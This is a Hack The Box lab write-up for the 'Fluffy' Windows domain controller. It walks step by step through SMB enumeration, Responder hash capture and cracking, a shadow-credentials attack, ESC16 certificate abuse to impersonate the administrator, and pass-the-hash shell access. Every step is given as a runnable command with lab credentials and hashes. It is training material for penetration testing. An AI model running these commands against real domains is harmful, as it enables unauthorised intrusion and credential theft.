# HTB Fluffy Write-Up

## Overview
This write-up details the complete penetration testing process of the HTB Fluffy machine, including successful attacks, failed attempts, and lessons learned. The target was a Windows domain environment where we exploited SMB misconfigurations, performed Kerberos attacks, and ultimately gained domain administrator privileges through certificate template vulnerabilities.

## Initial Reconnaissance

### Host Discovery
- Identified the target IP: `10.10.11.69`
- Added hostname to `/etc/hosts`:
  ```bash
  echo "10.10.11.69 DC01.fluffy.htb fluffy.htb" | sudo tee -a /etc/hosts
  ```

### Port Scanning
- Performed comprehensive Nmap scan:
  ```bash
  nmap -v -sCTV -p- -T4 -Pn -oN $IP.txt $IP
  ```
  - Discovered domain controller: `DC01.fluffy.htb`

## Initial Access via SMB

### Credential Spraying
- Used NetExec (nxc) for SMB credential spraying:
  ```bash
  nxc smb 10.10.11.69 -u j.fleischman -d fluffy.htb -p 'J0elTHEM4n1990!'
  ```
  - Successfully authenticated with credentials: `fluffy.htb\j.fleischman:J0elTHEM4n1990!`

### Share Enumeration
- Enumerated SMB shares:
  ```bash
  nxc smb 10.10.11.69 -u j.fleischman -d fluffy.htb -p 'J0elTHEM4n1990!' --shares
  ```
  - Discovered writable share: `IT`

### File Search
- Attempted to find KeePass database files:
  ```bash
  nxc smb 10.10.11.69 -u j.fleischman -p 'J0elTHEM4n1990!' -d fluffy.htb -x "dir /s C:\*.kdbx 2>nul"
  ```
  - No results found

## Exploring the IT Share

### Connecting to IT Share
- Connected to the IT share using smbclient:
  ```bash
  smbclient //10.10.11.69/IT -U j.fleischman
  ```
  - Found interesting files:
    - KeePass-2.58.zip
    - Everything-1.4.1.1026.x64.zip
    - Upgrade_Notice.pdf

### Uploading Exploit
- Uploaded an exploit file:
  ```bash
  put exploit.zip
  ```

## Credential Harvesting with Responder

### Setting Up Responder
- Started Responder to capture NTLMv2 hashes:
  ```bash
  sudo responder -I tun0 -wvF
  ```
  - Captured hash for user `p.agila`

### Cracking the Hash
- Cracked the NTLMv2 hash with John the Ripper:
  ```bash
  john pagila_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
  ```
  - Successfully cracked password: `prometheusx-303`

## Privilege Escalation to winrm_svc

### Adding to Privileged Group
- Added p.agila to SERVICE ACCOUNTS group:
  ```bash
  bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila
  ```

### Shadow Credentials Attack
- Performed shadow credentials attack on winrm_svc account:
  ```bash
  certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'
  ```
  - Obtained NT hash for winrm_svc: `33bd09dcd697600edf6b3a7af4875767`

### Gaining Shell Access
- Connected via Evil-WinRM:
  ```bash
  evil-winrm -i 10.10.11.69 -u 'winrm_svc' -H 33bd09dcd697600edf6b3a7af4875767
  ```
  - Found user flag: `f1e5d0decf5e24a8276abeea67528a43`

## Privilege Escalation to Domain Admin

### Discovering ESC16 Vulnerability
- Checked for vulnerable certificate templates:
  ```bash
  certipy-ad find -vulnerable -u CA_SVC -hashes ":ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip 10.10.11.69
  ```
  - Found ESC16 vulnerability: Security Extension disabled on CA globally

### Exploiting ESC16
1. **Time Synchronization**:
   ```bash
   sudo ntpdate 10.10.11.69
   ```

2. **Read CA_SVC Account Details**:
   ```bash
   certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -user 'ca_svc' read
   ```

3. **Modify UPN to Administrator**:
   ```bash
   certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'administrator' -user 'ca_svc' update
   ```

4. **Request Certificate**:
   ```bash
   certipy-ad shadow -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -account 'ca_svc' auto
   export KRB5CCNAME=ca_svc.ccache
   certipy-ad req -k -dc-ip '10.10.11.69' -target 'DC01.FLUFFY.HTB' -ca 'fluffy-DC01-CA' -template 'User'
   ```

5. **Restore Original UPN**:
   ```bash
   certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
   ```

6. **Authenticate as Administrator**:
   ```bash
   certipy-ad auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx' -username 'administrator' -domain 'fluffy.htb'
   ```
   - Obtained administrator NT hash: `aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e`

### Final Access
- Connected as administrator:
  ```bash
  evil-winrm -i 10.10.11.69 -u 'administrator' -H aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
  ```
  - Found root flag: `b462cf57b84a06664b1e47c349e5035f`

## Failed Attempts and Lessons Learned

1. **Initial SMB Enumeration**:
   - Attempted to find KeePass files but failed due to insufficient permissions
   - Lesson: Should have focused on writable shares first

2. **Kerberos Attacks**:
   - Multiple attempts to get TGS tickets failed due to time synchronization issues
   - Lesson: Always check and synchronize time with DC before Kerberos attacks

3. **Certificate Template Exploitation**:
   - Initial attempts failed due to missing group memberships
   - Lesson: Need to fully understand AD group memberships before attacks

4. **Web Enrollment**:
   - Attempts to access web enrollment failed with timeouts
   - Lesson: Some services might be disabled even if vulnerable

## Conclusion

This challenge demonstrated a complete attack path from initial access to domain compromise. Key takeaways include:

1. SMB shares often contain valuable information or provide initial footholds
2. NTLM relay and responder attacks are still effective in many environments
3. Certificate template vulnerabilities (like ESC16) can lead to domain compromise
4. Time synchronization is critical for Kerberos-based attacks
5. Persistence and thorough enumeration are key to successful penetration testing

The final path to root involved:
1. Initial access via SMB credentials
2. Credential harvesting with Responder
3. Privilege escalation via shadow credentials
4. Domain admin access through certificate template vulnerability exploitation
